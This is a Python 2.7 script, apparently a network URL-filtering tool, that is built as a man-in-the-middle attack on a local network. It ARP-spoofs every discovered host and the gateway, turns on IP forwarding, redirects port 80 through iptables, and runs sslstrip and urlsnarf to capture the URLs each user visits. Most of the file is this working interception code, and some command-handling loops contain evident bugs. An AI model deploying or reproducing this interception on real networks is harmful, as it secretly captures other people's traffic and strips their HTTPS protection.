#python 2.7

from multiprocessing import Pipe,Process, Queue
import logging
from threading import Thread,Lock
from time import sleep,strftime
from scapy.all import *
import functions
from sys import exit,stdin
from user import *
from os import system
from subprocess import Popen,PIPE
from urlparse import urlparse
from db_api import *
# except ImportError:
#
#     #TODO: handle all cases of missing modules and try to solve
#     print 'a module is missing please check you have all required modules'


# global variables:
localAddresses=[]
addressesLock=Lock()
user_list=[]
localHost=''
main_conn=Pipe()
defaultGateway=''


def blocked(user,url):
	"""
	return True if site is blocked for user
	"""
	if user.get_privilege() == 1: #blacklist user
		for l_url in user.url_list:
		    if l_url[1] == url:
		        return True
		return False

	for l_url in user.get_url_list(): #whitelist user
		if l_url[1] == url:
		    return False
	return True

def process_domain(domain,ip):
	global user_list
	for user in user_list:
		if user.get_mac() == localAddresses[ip]:
			print "urls d:"+str(user.get_url_list())
			if blocked(user,domain):
				add_violation((user.get_id(),domain,str(strftime("%y-%m-%d %H:%M:%S")))) #add violation to database
				print 'violation: ip {}, domain {}'.format(ip,domain)
				logging.info('violation: ip {}, domain {}'.format(ip,domain))

def handle_packet(pkt):
	"""
	checks for new host/address changes on network
	checks if arp operation is 'is-at' adn then update new address in the local addresses dict
	"""

	if ARP in pkt:
		if pkt[ARP].op == 2:#check if ARP operation is: is-at
			address=pkt[ARP].psrc #extract IP address
			addressesLock.acquire()
			global localAddresses
			global localHost
			global defaultGateway
			if address not in localAddresses.keys() and address != defaultGateway and address!=localHost: #check for duplicates and not default gateway or local host
				localAddresses[address]=pkt[Ether].src #add IP  and MAC address to dict of all hosts
				add_new_hosts(localAddresses)
				logging.info('added: {}'.format(address))
				print 'added: {}'.format(address)
				print 'scapy:'+str(localAddresses)
			addressesLock.release()


def spoof(target,defaultGateway):
	"""
	arp spoofs specific ip address
	utilizes arpspoof package
	"""
	Popen('arpspoof -i eth0 -t {} {}'.format(target,defaultGateway),shell=True) #-i [interface] -t [target] [gateway]

def arp_spoof(defaultGateway):
	"""
	creates threads for spoofing each host on network
	"""
	threads={}
	while True:
		for target in localAddresses.keys():
			if target not in threads.keys():
				s=Thread(target=spoof,args=(target,defaultGateway,)) #thread for spoofing target
				s.start()
				s2=Thread(target=spoof,args=(defaultGateway,target)) #thread for spoofing router
				s2.start()
				threads[target]=[s,s2]
				logging.debug('spoofing:'+target)
		sleep(20)


def arp_sniff():
	"""
	sniff for incoming arp packets
	"""
	sniff(prn=handle_packet)

def url_sniff():
	urlsnarf=Popen('urlsnarf',stdout=PIPE,shell=True) #start urlsnarf
	logging.info('urlsnarf started')
	last_domain=''
	while True:
		output=urlsnarf.stdout.readline() #read from output
		fields=output.split(' ')
		ip=fields[0] #extact ip address
		for f in fields:
			if 'http' in f and '?' not in f: #for url that is noy query
				url=f
				domain=url.split('/')[2] #extract domain
				if domain != last_domain:#if it is a new site
					if ip in localAddresses.keys():
						last_domain=domain
						logging.debug('ip:{},domain:{}'.format(ip,domain))
						process_domain(domain.split('www.')[-1],ip) #process domain if blocked (split domain to remove 'www.' to prevent errors) 

def setup():
	"""
	get all necessary values for the program to run
	and start all threads
	"""

	hosts=get_users_list()
	for host in hosts:
		new_host=get_user(host[1])
		if new_host[2] == 2:
			urls=get_urls(host[1])
			global user_list
			user_list.append(User(host[1],str(new_host[0]),new_host[1],urls))
			logging.debug('new user:{},{},{}'.format(host[1],host[0],user_list[-1].get_url_list()))
	print 'all users created'
	logging.info('all users created ({})'.format(len(user_list)))



	#get default gateway, local IP address and local MAC address
	global defaultGateway
	global localHost
	defaultGateway,localHost=functions.getLocalhostAddress()
	logging.info('router:{}, local host:{}'.format(defaultGateway,localHost))
	print defaultGateway,localHost

	#get addresses of all hosts on network
	global localAddresses
	localAddresses=functions.get_Local_Addresses(defaultGateway,localHost)
	if defaultGateway in localAddresses.keys():
		del localAddresses[defaultGateway] #remove default gateway from address dict to prevent unneccery spoofing etc.
		logging.debug('removed default gateway from local addresses list')
	logging.info('scanned network for all active hosts')
	print localAddresses

	#add mac addresses to database that do not have a user associated with them
	add_new_hosts(localAddresses)

	#turn ip forwarding on
	system('sysctl -w net.ipv4.ip_forward=1')
	Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=PIPE, stderr=PIPE, shell=True)
	Popen('sslstrip -p -k -f', stdout=PIPE, stderr=PIPE, shell=True)
	logging.info('ip forwarding enabled')

	#create process for spoofing all hosts on network
	arpThread=Process(target=arp_spoof,args=(defaultGateway,))
	logging.info('created process for ARP spoofing')
	arpThread.start()

	#create process for urlsnarf
	#q=Queue()
	url_sniffer=Thread(target=url_sniff)
	url_sniffer.start()

	#create thread for sniffing for arp packets to add new hosts to list
	arp_sniffer=Thread(target=arp_sniff)
	arp_sniffer.start()
	logging.info('arp sniffer started')
	#return q


def main(conn=None):
	"""
	control the whole program
	gets the parameters for working
	then calls all functions in order
	"""
	#setup logging to file logFile.log
	logging.basicConfig(filename='MITM_log.log',level=logging.DEBUG, format='%(lineno)s - %(levelname)s : %(message)s')
	logging.info('\n\n\n\n\n########## MITM Start ##########\n\n')

	global main_conn
	main_conn=conn
	#get all required variables and start all threads
	setup()
	logging.info('setup complete')
	global user_list
	while True:
		command=main_conn.recv()

		if command==1:
			
			host_id=main_conn.recv()
			new_user=get_user(host_id)
			print "new user:"+str(new_user)
			
			user_list.append(User(host_id,str(new_user[0]),new_user[1],get_urls(host_id)))
			#sniffer_q.put_nowait(user_list)
			print "user add len:"+ str(len(user_list))
			
		elif command==2:
			host_id=main_conn.recv()
			#global user_list
			for i in len(user_list):
				
				if host_id==user_list[i].get_id():
					#global user_list
					del user_list[i]
					#sniffer_q.put_nowait(user_list)
					logging.info('user {} deleted'.format(host_id))
					

		elif command == 3:
			host_id=main_conn.recv()
			print "id"+str(host_id) +str(len(user_list))
			#global user_list
			for i in range(len(user_list)+1):
				print i
				print "shit"+str(user_list[i].get_url_list())
				print host_id==user_list[i].get_id()
				if host_id==user_list[i].get_id():
					print type(get_urls(host_id))
					print user_list[i].update_url_list(get_urls(host_id))
					print "check:"+str(user_list[i].get_url_list())
					#sniffer_q.put_nowait(user_list)
					logging.debug('updated url list for user {}'.format(host_id))
			for host in user_list:
				print "urls:"+str(host.get_url_list())
					

		elif command==4:
			url_id=main_conn.recv()
			#global user_list
			for host in user_list:
				if host.remove(url_id):
					logging.debug('url {} deleted for user {}'.format(url_id,host.get_id()))
					
		elif command==10:
			data=main_conn.recv()
			#global user_list
			for host in user_list:
				if host.get_id() == data[0]:
					host.set_privilege(data[1])
					#sniffer_q.put_nowait(user_list)
					print "updated privilege "+data[0]
					





if __name__=='__main__':
    main()
